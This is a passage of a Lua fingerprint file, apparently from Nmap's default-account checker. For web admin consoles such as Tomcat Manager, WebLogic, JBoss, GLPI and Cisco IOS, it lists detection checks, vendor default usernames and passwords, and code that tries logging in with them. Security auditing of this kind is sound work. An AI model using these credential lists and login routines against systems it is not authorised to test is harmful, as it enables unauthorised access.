    local jstatus, jout = json.parse(resp1.body)
    if not (jstatus and type(jout.databases) == "table") then return false end
    for _, db in ipairs(jout.databases) do
      if try_http_auth(host, port,
                      url.absolute(path, "connect/" .. url.escape(db)),
                      user, pass, false) then
        return true
      end
    end
    return false
  end
})

table.insert(fingerprints, {
  name = "RockMongo",
  cpe = "cpe:/a:rockmongo:rockmongo",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local loc = response.header["location"] or ""
    if not (response.status == 302
           and loc:find("/index.php?action=login.index", 1, true)) then
      return false
    end
    local resp = http_get_simple(host, port, loc)
    return resp.status == 200
           and resp.body
           and resp.body:find("RockMongo", 1, true)
           and resp.body:lower():find("<title>rockmongo</title>")
           and get_tag(resp.body, "select", {name="^host$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {more=0,
                  host=0,
                  username=user,
                  password=pass,
                  db="",
                  lang="en_us",
                  expire=3}
    local resp = http_post_simple(host, port,
                                  url.absolute(path, "index.php?action=login.index&host=0"),
                                  nil, form)
    return resp.status == 302
           and (resp.header["location"] or ""):find("?action=admin.index", 1, true)
           and get_cookie(resp, "ROCK_LANG", "^[%a_]+$")
  end
})

table.insert(fingerprints, {
  name = "Sambar Server",
  cpe = "cpe:/a:sambar:sambar_server",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^SAMBAR%f[%s\0]")
  end,
  login_combos = {
    {username = "admin",     password = ""},
    {username = "anonymous", password = ""},
    {username = "billy-bob", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "session/login"),
                        user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "WebLogic Server Console",
  cpe = "cpe:/a:bea:weblogic_server",
  category = "web",
  paths = {
    {path = "/console/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["location"] or ""):find("/console/login/LoginForm%.jsp%f[;\0]")
  end,
  login_combos = {
    {username = "weblogic", password = "weblogic"},
    {username = "weblogic", password = "weblogic1"},
    {username = "weblogic", password = "welcome1"},
    {username = "weblogic", password = "password"},
    {username = "system",   password = "Passw0rd"},
    {username = "system",   password = "password"},
    {username = "operator", password = "Passw0rd"},
    {username = "operator", password = "password"},
    {username = "monitor",  password = "Passw0rd"},
    {username = "monitor",  password = "password"},
    {username = "oraclesystemuser", password = "Passw0rd"},
    {username = "oraclesystemuser", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {j_username=user,
                  j_password=pass,
                  j_character_encoding="UTF-8"}
    local header = {["Referer"]=url.build(url_build_defaults(host, port, {path=path}))}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "j_security_check"),
                                 {header=header}, form)
    if not (resp.status >= 200 and resp.status <= 399) then return false end
    if resp.status == 302
       and (resp.header["location"] or ""):find("/console/login/LoginForm%.jsp$") then
      return false
    end
    return true
  end
})

table.insert(fingerprints, {
  name = "WebSphere Community Edition Console",
  cpe = "cpe:/a:ibm:websphere_application_server",
  category = "web",
  paths = {
    {path = "/console/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["location"] or ""):find("/portal%f[/].-/Welcome%f[?\0]")
  end,
  login_combos = {
    {username = "system", password = "manager"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    local resource = resp1.header["location"]
    if not (resp1.status == 302 and resource) then return false end
    local respath = resource:match("%f[/]/%f[^/].*"):gsub("/%.%f[/]", "")
    local resp2 = http_get_simple(host, port, respath)
    if resp2.status ~= 200 then return false end
    local form3 = {j_username=user,
                   j_password=pass,
                   submit="Login"}
    local resp3 = http_post_simple(host, port,
                                  url.absolute(respath, "j_security_check"),
                                  {cookies=resp2.cookies}, form3)
    return resp3.status == 302
       and (resp3.header["location"] or ""):find(respath, 1, true)
  end
})

table.insert(fingerprints, {
  name = "JBoss EAP Admin Console",
  cpe = "cpe:/a:redhat:jboss_enterprise_application_platform",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/admin-console/", 1, true)
           and get_tag(response.body, "a", {href="/admin%-console/$"})
           and response.body:lower():find("<title>welcome to jboss", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local curl = url.absolute(path, "admin-console/")
    local resp1 = http_get_simple(host, port,
                                 url.absolute(curl, "secure/summary.seam"))
    local lurl = resp1.header["location"]
    if not (resp1.status == 302 and lurl) then return false end
    local lpath = lurl:match("%f[/]/%f[^/].*")
    local resp2 = http_get_simple(host, port, lpath)
    if resp2.status ~= 200 then return false end
    local form3 = {login_form="login_form",
                   ["login_form:name"]=user,
                   ["login_form:password"]=pass,
                   ["login_form:submit"]="Login",
                   ["javax.faces.ViewState"]="j_id1"}
    local resp3 = http_post_simple(host, port, lpath:gsub("[;?].*$", ""),
                                  {cookies=resp1.cookies}, form3)
    return resp3.status == 302
       and (resp3.header["location"] or ""):find("/admin-console/secure/summary.seam?conversationId=", 1, true)
  end
})

table.insert(fingerprints, {
  name = "JBoss JMX Console",
  cpe = "cpe:/a:redhat:jboss_enterprise_application_platform",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/jmx-console/", 1, true)
           and get_tag(response.body, "a", {href="/jmx%-console/$"})
           and response.body:lower():find("<title>welcome to jboss", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "jmx-console/"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "JBoss Web Console",
  cpe = "cpe:/a:redhat:jboss_enterprise_web_platform",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/web-console/", 1, true)
           and get_tag(response.body, "a", {href="/web%-console/$"})
           and response.body:lower():find("<title>welcome to jboss", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "web-console/"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Apache Tomcat Manager",
  cpe = "cpe:/a:apache:tomcat",
  category = "web",
  paths = {
    {path = "/manager/html/"},
    {path = "/manager/status/"},
    {path = "/tomcat/manager/html/"},
    {path = "/tomcat/manager/status/"},
    {path = "/cognos_express/manager/html/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "Tomcat Manager Application"
  end,
  login_combos = {
    {username = "tomcat", password = "tomcat"},
    {username = "admin", password = "admin"},
    {username = "admin", password = ""},
    {username = "admin", password = "tomcat"},
    {username = "ADMIN", password = "ADMIN"},
    {username = "ovwebusr", password = "OvW*busr1"},
    {username = "j2deployer", password = "j2deployer"},
    {username = "cxsdk", password = "kdsxc"},
    {username = "xampp", password = "xampp"},
    {username = "QCC", password = "QLogic66"},
    {username = "fhir", password = "FHIRDefaultPassword"},
    {username = "username", password = "password"},
    {username = "username1", password = "password"},
    {username = "pippo", password = "paperino"},
    {username = "topolino", password = "minnie"},
    {username = "root", password = "vagrant"},
    {username = "tomcat", password = "s3cret"},
    {username = "root", password = "owaspbwa"},
    {username = "admin", password = "owaspbwa"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Apache Tomcat Host Manager",
  cpe = "cpe:/a:apache:tomcat",
  category = "web",
  paths = {
    {path = "/host-manager/html/"},
    {path = "/host-manager/text/"},
    {path = "/tomcat/host-manager/html/"},
    {path = "/tomcat/host-manager/text/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "Tomcat Host Manager Application"
  end,
  login_combos = {
    {username = "tomcat", password = "tomcat"},
    {username = "admin", password = "admin"},
    {username = "admin", password = ""},
    {username = "ADMIN", password = "ADMIN"},
    {username = "xampp", password = "xampp"},
    {username = "QCC", password = "QLogic66"},
    {username = "fhir", password = "FHIRDefaultPassword"},
    {username = "username", password = "password"},
    {username = "pippo", password = "paperino"},
    {username = "root", password = "vagrant"},
    {username = "tomcat", password = "s3cret"},
    {username = "root", password = "owaspbwa"},
    {username = "admin", password = "owaspbwa"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Apache ActiveMQ",
  cpe = "cpe:/a:apache:activemq",
  category = "web",
  paths = {
    {path = "/admin/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "ActiveMQRealm"
  end,
  login_combos = {
    {username = "user",  password = "user"},
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Pivotal RabbitMQ",
  cpe = "cpe:/a:pivotal_software:rabbitmq",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("RabbitMQ", 1, true)
           and response.body:lower():find("<title>rabbitmq management</title>", 1, true)
           and get_tag(response.body, "div", {id="^outer$"})
  end,
  login_combos = {
    {username = "guest", password = "guest"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "api/whoami"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "OSGi Management Console",
  category = "web",
  paths = {
    {path = "/system/console"},
    {path = "/lc/system/console"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "OSGi Management Console"
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "karaf", password = "karaf"},
    {username = "smx",   password = "smx"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Apache Axis2",
  cpe = "cpe:/a:apache:axis2",
  category = "web",
  paths = {
    {path = "/axis2/axis2-admin/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Axis2", 1, true)
           and response.body:lower():find("<title>login to axis2 :: administration page</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "axis2"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "login"), nil,
                                 {userName=user,password=pass,submit=" Login "})
    return resp.status == 200
           and get_tag(resp.body or "", "a", {href="^axis2%-admin/logout$"})
  end
})

table.insert(fingerprints, {
  name = "Apache Ofbiz",
  cpe = "cpe:/a:apache:ofbiz",
  category = "web",
  paths = {
    {path = "/webtools/"}
  },
  target_check = function (host, port, path, response)
    local loc = response.header["location"] or ""
    if not (response.status == 302
           and loc:find(url.absolute(path, "control/main"), 1, true)) then
      return false
    end
    local resp = http_get_simple(host, port, loc)
    return resp.status == 200
           and resp.body
           and resp.body:find(url.absolute(loc, "checkLogin"), 1, true)
           and resp.body:lower():find("powered by%s+<a%f[%s][^>]-%shref%s*=%s*['\"]https?://ofbiz%.apache%.org%W")
  end,
  login_combos = {
    {username = "admin", password = "ofbiz"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {USERNAME=user,
                  PASSWORD=pass,
                  JavaScriptEnabled="Y"}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "control/login"),
                                 nil, form)
    return resp.status == 200
           and get_cookie(resp, path:match("/([^/]+)/$") .. ".autoUserLoginId") == user
  end
})

table.insert(fingerprints, {
  name = "Opencast Matterhorn",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local loc = response.header["location"] or ""
    if not (response.status == 302
           and loc:find("/login%.html%f[;\0]")
           and get_cookie(response, "JSESSIONID", "^%w+$")) then
      return false
    end
    local resp = http_get_simple(host, port, loc)
    return resp.status == 200
           and resp.body
           and resp.body:find("Matterhorn", 1, true)
           and resp.body:lower():find("<title>opencast matterhorn ", 1, true)
           and get_tag(resp.body, "form", {action="/j_spring_security_check$"})
  end,
  login_combos = {
    {username = "admin", password = "opencast"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {j_username=user,
                  j_password=pass,
                  submit="Login"}
    local resp = http_post_simple(host, port,
                                  url.absolute(path, "j_spring_security_check"),
                                  nil, form)
    return resp.status == 302
           and (resp.header["location"] or ""):find("/welcome%.html$")
           and get_cookie(resp, "JSESSIONID", "^%w+$")
  end
})

table.insert(fingerprints, {
  name = "Opencast",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["location"] or ""):find("/admin%-ng/login%.html%f[;\0]")
           and get_cookie(response, "JSESSIONID", "^%w+$")
  end,
  login_combos = {
    {username = "admin", password = "opencast"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "admin-ng/j_spring_security_check"),
                                 nil, {j_username=user, j_password=pass})
    return resp.status == 302
           and (resp.header["location"] or ""):find("/admin%-ng/index%.html$")
           and get_cookie(resp, "JSESSIONID", "^%w+$")
  end
})

table.insert(fingerprints, {
  name = "Plumtree Portal",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["location"] or ""):find("/portal/server%.pt$")
  end,
  login_combos = {
    {username = "Administrator", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local form = {in_hi_space="Login",
                  in_hi_spaceID="0",
                  in_hi_control="Login",
                  in_hi_dologin="true",
                  in_tx_username=user,
                  in_pw_userpass=pass,
                  in_se_authsource=""}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "portal/server.pt"),
                                 nil, form)
    return resp.status == 302
           and (resp.header["location"] or ""):find("/portal/server%.pt[;?]")
           and get_cookie(resp, "plloginoccured") == "true"
  end
})

table.insert(fingerprints, {
  name = "GLPI",
  cpe = "cpe:/a:glpi-project:glpi",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("GLPI", 1, true)
           and response.body:lower():find("<title>glpi ", 1, true)
           and get_tag(response.body, "input", {name="^login_name$"})
  end,
  login_combos = {
    {username = "glpi",      password = "glpi"},
    {username = "tech",      password = "tech"},
    {username = "post-only", password = "postonly"},
    {username = "normal",    password = "normal"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local token = get_tag(resp1.body, "input", {type="^hidden$", name="^_glpi_csrf_token$", value=""})
    if not token then return false end
    local form2 = {login_name=user,
                   login_password=pass,
                   submit="Post",
                   [token.name]=token.value}
    local header = {["Referer"]=url.build(url_build_defaults(host, port, {path=path}))}
    local resp2 = http_post_simple(host, port, url.absolute(path, "login.php"),
                                  {cookies=resp1.cookies, header=header}, form2)
    return resp2.status == 200
           and (resp2.body or ""):find("%Wwindow%.location%s*=%s*(['\"])[^'\"]-/front/[%w.]+%.php%1")
  end
})

table.insert(fingerprints, {
  name = "OTRS",
  cpe = "cpe:/a:otrs:otrs",
  category = "web",
  paths = {
    {path = "/otrs/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("OTRS", 1, true)
           and response.body:find(url.absolute(path, "index.pl"), 1, true)
           and get_tag(response.body, "input", {name="^requestedurl$"})
  end,
  login_combos = {
    {username = "root@localhost", password = "root"},
    {username = "root@localhost", password = "changeme"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {Action="Login",
                  RequestedURL="",
                  Lang="en",
                  TimeOffset=0,
                  User=user,
                  Password=pass}
    local resp = http_post_simple(host, port, url.absolute(path, "index.pl"),
                                 nil, form)
    return resp.status == 302
           and get_cookie(resp, "OTRSAgentInterface", "^%w+$")
  end
})

table.insert(fingerprints, {
  name = "Ilias (var.1)",
  cpe = "cpe:/a:ilias:ilias",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and get_cookie(response, "ilClientId")
           and (response.header["location"] or ""):find("%f[^/\0]login%.php%?.*%f[^?&]client_id=")
  end,
  login_combos = {
    {username = "root", password = "homer"}
  },
  login_check = function (host, port, path, user, pass)
    local resp0 = http_get_simple(host, port, path)
    local furl = (resp0.header["location"] or ""):gsub("^https?://[^/]*", "")
    if not (resp0.status == 302 and furl:find("%f[^/\0]login%.php%?")) then
      return false
    end
    furl = url.absolute(path, furl)
    local resp1 = http_get_simple(host, port, furl, {cookies=resp0.cookies})
    if not (resp1.status == 200 and resp1.body) then return false end
    local frm = get_tag(resp1.body, "form", {name="^formlogin$", action="[?&;]client_id="})
    if not frm then return false end
    local form = {username=user,
                  password=pass,
                  ["cmd[doStandardAuthentication]"]="Anmelden"}
    local resp2 = http_post_simple(host, port,
                                  url.absolute(furl, xmldecode(frm.action)),
                                  {cookies=resp0.cookies}, form)
    return resp2.status == 302
           and (resp2.header["location"] or ""):find("/ilias%.php?%?")
  end
})

table.insert(fingerprints, {
  name = "Ilias (var.2)",
  cpe = "cpe:/a:ilias:ilias",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and get_cookie(response, "ilClientId")
           and (response.header["location"] or ""):find("%f[^/\0]ilias%.php%f[?\0]")
  end,
  login_combos = {
    {username = "root", password = "homer"}
  },
  login_check = function (host, port, path, user, pass)
    local resp0 = http_get_simple(host, port, path)
    if resp0.status ~= 302 then return false end
    local form1 = {target="",
                   client_id=get_cookie(resp0, "ilClientId"),
                   cmd="force_login",
                   lang="en"}
    local furl = url.absolute(path, "login.php?" .. url.build_query(form1))
    local resp1 = http_get_simple(host, port, furl, {cookies=resp0.cookies})
    if not (resp1.status == 200 and resp1.body) then return false end
    local frm = get_tag(resp1.body, "form", {name="^formlogin$", action="[?&;]client_id="})
    if not frm then return false end
    local form = {username=user,
                  password=pass,
                  ["cmd[doStandardAuthentication]"]="Anmelden"}
    local resp2 = http_post_simple(host, port,
                                  url.absolute(furl, xmldecode(frm.action)),
                                  {cookies=resp0.cookies}, form)
    return resp2.status == 302
           and (resp2.header["location"] or ""):find("/ilias%.php?%?")
  end
})

table.insert(fingerprints, {
  name = "Jitamin",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["location"] or ""):find("%?controller=Auth/AuthController&action=login$")
           and get_cookie(response, "JM_SID")
  end,
  login_combos = {
    {username = "admin",           password = "admin"},
    {username = "admin@admin.com", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local lurl = path .. "?controller=Auth/AuthController&action="
    local resp1 = http_get_simple(host, port, lurl .. "login")
    if not (resp1.status == 200 and resp1.body) then return false end
    local token = get_tag(resp1.body, "input", {type="^hidden$", name="^csrf_token$", value=""})
    if not token then return false end
    local form = {[token.name]=token.value,
                  username=user,
                  password=pass}
    local resp2 = http_post_simple(host, port, lurl .. "check",
                                  {cookies=resp1.cookies}, form)
    return resp2.status == 302
           and (resp2.header["location"] or ""):find("%?controller=Dashboard/DashboardController&action=index$")
  end
})

table.insert(fingerprints, {
  name = "Kanboard",
  cpe = "cpe:/a:kanboard:kanboard",
  category = "web",
  paths = {
    {path = "/"},
    {path = "/kanboard/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["location"] or ""):find("%?controller=AuthController&action=login$")
           and get_cookie(response, "KB_SID")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local lurl = path .. "?controller=AuthController&action="
    local resp1 = http_get_simple(host, port, lurl .. "login")
    if not (resp1.status == 200 and resp1.body) then return false end
    local token = get_tag(resp1.body, "input", {type="^hidden$", name="^csrf_token$", value=""})
    if not token then return false end
    local form = {[token.name]=token.value,
                  username=user,
                  password=pass}
    local resp2 = http_post_simple(host, port, lurl .. "check",
                                  {cookies=resp1.cookies}, form)
    return resp2.status == 302
           and (resp2.header["location"] or ""):find("%?controller=DashboardController&action=show$")
  end
})

table.insert(fingerprints, {
  name = "RainLoop Webmail",
  category = "web",
  paths = {
    {path = "/"},
    {path = "/rainloop/"},
    {path = "/webmail/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("rainloop/v/", 1, true)
           and get_tag(response.body, "link", {href="^rainloop/v/%d[%d.]+%d/static/css/app%.min%.css%f[?\0]"})
  end,
  login_combos = {
    {username = "admin", password = "12345"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path .. "?/AdminAppData")
    if not (resp1.status == 200 and resp1.body) then return false end
    local jstr = resp1.body:match('{[^{]*"Auth"%s*:.*"PluginsLink"%s*:[^}]*}')
    local jstatus, jout = json.parse(jstr or "{}")
    local token = jstatus and (jout.Token or jout.System and jout.System.token)
    if not token then return false end
    local form2 = {Login=user,
                   Password=pass,
                   Action="AdminLogin",
                   XToken=token}
    local resp2 = http_post_simple(host, port, path .. "?/Ajax/&q[]=/0/",
                                  {cookies = resp1.cookies}, form2)
    if not (resp2.status == 200 and resp2.body) then return false end
    jstatus, jout = json.parse(resp2.body)
    return jstatus and jout.Action == "AdminLogin" and jout.Result
  end
})

table.insert(fingerprints, {
  name = "TeamPass",
  cpe = "cpe:/a:teampass:teampass",
  category = "web",
  paths = {
    {path = "/"},
    {path = "/teampass/"},
    {path = "/TeamPass/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and tableaux.contains(openssl.supported_ciphers(), "aes-256-ecb")
           and tableaux.contains(openssl.supported_ciphers(), "aes-256-ctr")
           and response.status == 200
           and response.body
           and response.body:find("TeamPass", 1, true)
           and response.body:find("(['\"])sources/main%.queries%.php%1")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local lurl = resp1.body:match("['\"]([^'\"]+)['\"]%s*,%s*{%s*type%s*:%s*['\"]identify_user['\"]")
    local aespwd = resp1.body:match("%Wreturn%s+Aes%.Ctr%.encrypt%s*%(%s*%w+%s*,%s*['\"](.-)['\"]%s*,%s*256%s*%)")
                or resp1.body:match("['\"]identify_user['\"]%s*,%s*data%s*:%s*prepareExchangedData%(%s*%w+%s*,%s*['\"]encode['\"]%s*,%s*['\"](.-)['\"]")
    if not (lurl and aespwd) then return false end
    aespwd = aespwd .. ("\0"):rep(32-#aespwd)
    local aeskey = openssl.encrypt("aes-256-ecb", aespwd, nil, aespwd):sub(1, 16):rep(2)
    local nonce = ("<I4"):pack(math.floor(stdnse.clock_ms() / 1000))
                  .. string.char(math.random(0, 255)):rep(4)
    local randstr = random_alnum(10)
    local jin = {login=user,
                 pw=pass,
                 duree_session="60",
                 screenHeight=tostring(math.random(480, 1024)),
                 randomstring=randstr}
    json.make_object(jin)
    local ctext = base64.enc(nonce .. openssl.encrypt("aes-256-ctr", aeskey, nonce .. ("\0"):rep(8), json.generate(jin)))
    local resp2 = http_post_simple(host, port, url.absolute(path, lurl),
                                  {cookies = resp1.cookies},
                                  {type="identify_user",data=ctext})
    if not (resp2.status == 200 and resp2.body) then return false end
    local jstatus, jout = json.parse(resp2.body)
    return jstatus and jout[1] and jout[1].value == randstr
  end
})

table.insert(fingerprints, {
  name = "CapeSoft TimeClock",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("TimeClock", 1, true)
           and response.body:lower():find("<title>capesoft time clock web ", 1, true)
           and response.body:lower():find("%Whref%s*=%s*(['\"])employees%.php%1")
  end,
  login_combos = {
    {username = "9970", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "employees.php"), nil,
                                 {login=user,password=pass,action="Login"})
    return resp.status == 200
           and (resp.body or ""):find("%sclass%s*=%s*(['\"]?)logout%1[%s>]")
  end
})

table.insert(fingerprints, {
  name = "BeEF",
  category = "web",
  paths = {
    {path = "/ui/authentication/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("BeEF", 1, true)
           and response.body:lower():find("<title>beef authentication</title>", 1, true)
  end,
  login_combos = {
    {username = "beef", password = "beef"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "login"), nil,
                                 {["username-cfrm"]=user, ["password-cfrm"]=pass})
    return resp.status == 200
           and (resp.body or ""):find("{%s*success%s*:%s*true%s*}")
  end
})

table.insert(fingerprints, {
  name = "Greenbone Security Assistant",
  cpe = "cpe:/a:greenbone:greenbone_security_assistant",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local loc = (response.header["location"] or ""):gsub("^https?://[^/]*", "")
    if not (response.status == 303
           and loc:find("/login/login%.html$")) then
      return false
    end
    local resp = http_get_simple(host, port, loc)
    return resp.status == 200
           and resp.body
           and resp.body:find("Greenbone", 1, true)
           and resp.body:lower():find("<title>greenbone security assistant</title>", 1, true)
           and get_tag(resp.body, "form", {action="/omp$"})
  end,
  login_combos = {
    {username = "admin",  password = "admin"},
    {username = "sadmin", password = "changeme"}
  },
  login_check = function (host, port, path, user, pass)
    local lurl = url.absolute(path, "omp")
    local form = {cmd="login",
                  text=lurl.."?r=1",
                  login=user,
                  password=pass}
    local resp = http_post_simple(host, port, lurl, nil, form)
    return resp.status == 303
           and (resp.header["location"] or ""):find("/omp%?.*%f[^?&]token=")
  end
})

table.insert(fingerprints, {
  name = "Sagitta Hashstack",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local lurl = (response.header["location"] or ""):gsub("^https?://[^/]*", "")
    if not (response.status == 302 and lurl:find("/login$")) then
      return false
    end
    local resp = http_get_simple(host, port, lurl)
    return resp.status == 200
           and resp.body
           and resp.body:find("hashstack", 1, true)
           and resp.body:lower():find("<title>hashstack - login</title>", 1, true)
           and get_tag(resp.body, "form", {class="^form%-signin$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local header = {["Accept"]="application/json, text/plain, */*",
                    ["Content-Type"]="application/json"}
    local jin = {username=user, password=pass}
    json.make_object(jin)
    local resp = http_post_simple(host, port, url.absolute(path, "login"),
                                 {header=header}, json.generate(jin))
    return resp.status == 200 and get_cookie(resp, "sid", ".")
  end
})

table.insert(fingerprints, {
  name = "ZKSoftware WebServer",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "ZK Web Server"
           and response.body
           and response.body:find("%Wlocation%.href%s*=%s*(['\"])[^'\"]-/csl/login%1")
  end,
  login_combos = {
    {username = "administrator", password = "123456"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200) then return false end
    local resp2 = http_post_simple(host, port, url.absolute(path, "csl/check"),
                                  {cookies=resp1.cookies},
                                  {username=user, userpwd=pass})
    return resp2.status == 200
           and get_tag(resp2.body or "", "frame", {src="/csl/menu$"})
  end
})

table.insert(fingerprints, {
  name = "ComfortableMexicanSofa",
  category = "web",
  paths = {
    {path = "/admin/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 302 and response.body) then return false end
    local loc = response.header["location"] or ""
    local _, pos = loc:find(url.absolute(path, "sites/"), 1, true)
    if not pos then return false end
    loc = loc:sub(pos)
    if not (loc == "/new" or loc:find("^/%d+/")) then return false end
    for _, ck in ipairs(response.cookies or {}) do
      if ck.name:find("_session$") then return ck.value:find("%-%-%x+$") end
    end
    return false
  end,
  login_combos = {
    {username = "username", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "sites/new"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Hippo CMS",
  category = "web",
  paths = {
    {path = "/"},
    {path = "/cms/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("hippo-login", 1, true)
           and get_tag(response.body, "input", {name="^id2_hf_0$"})
  end,
  login_combos = {
    {username = "admin",  password = "admin"},
    {username = "editor", password = "editor"},
    {username = "author", password = "author"}
  },
  login_check = function (host, port, path, user, pass)
    local lurl;
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local submit = get_tag(resp1.body, "input", {name="^:submit$", onclick=""})
    if submit then
      local qry = submit.onclick:match("=%s*wicketSubmitFormById%(['\"]id%d+['\"],%s*['\"](.-)['\"]")
      if not qry then return false end
      lurl = xmldecode(qry) .. "&random=" .. math.random()
    else
      local frm = get_tag(resp1.body, "form", {name="^signInForm$", action=""})
      if not frm then return false end
      lurl = frm.action
    end
    local form = {id2_hf_0="",
                  username=user,
                  password=pass,
                  locale="en",
                  [":submit"]="log in"}
    local resp2 = http_post_simple(host, port, url.absolute(path, lurl),
                                  {cookies=resp1.cookies}, form)
    return resp2.status == 302
           and (resp2.header["location"] or ""):sub(-#path) == path
  end
})

---
--ROUTERS
---
table.insert(fingerprints, {
  name = "Cisco IOS",
  cpe = "cpe:/o:cisco:ios",
  category = "routers",
  paths = {
    {path = "/"},
  },
  target_check = function (host, port, path, response)
    local realm = http_auth_realm(response) or ""
    return realm:gsub("_"," "):find("^level 15?%f[ ].* access$")
  end,
  login_combos = {
    {username = "", password = ""},
    {username = "cisco", password = "cisco"},
    {username = "Cisco", password = "Cisco"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Cisco Small Business 200",
  category = "routers",
  paths = {
